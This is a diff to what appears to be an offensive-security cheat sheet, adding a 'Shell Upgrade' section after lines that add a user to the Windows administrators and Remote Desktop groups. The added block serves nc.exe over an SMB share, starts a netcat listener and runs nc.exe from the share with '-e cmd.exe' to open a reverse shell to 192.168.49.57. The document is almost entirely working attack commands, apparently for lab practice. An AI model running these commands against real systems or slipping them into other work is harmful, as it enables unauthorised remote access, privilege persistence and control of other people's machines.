@@ -46,6 +46,22 @@ net localgroup administrators haji /add
 net localgroup "Remote Desktop Users" haji /add
 ```
 
+# Shell Upgrade
+```
+#COPY NETCAT
+cp /usr/share/windows-resources/binaries/nc.exe .
+
+#SERVE IT VIA SMB
+smbserver.py -smb2support -username evil -password evil evil $PWD
+
+#START LISTENER ON ANOTHER PORT
+nc -lnvp 80
+
+#Execute nc.exe by using the UNC path.
+net use z: \\192.168.49.57\evil /user:evil evil
+Z:\nc.exe 192.168.49.57 80 -e cmd.exe
+```
+
 
 ## Binary Hijacking
 
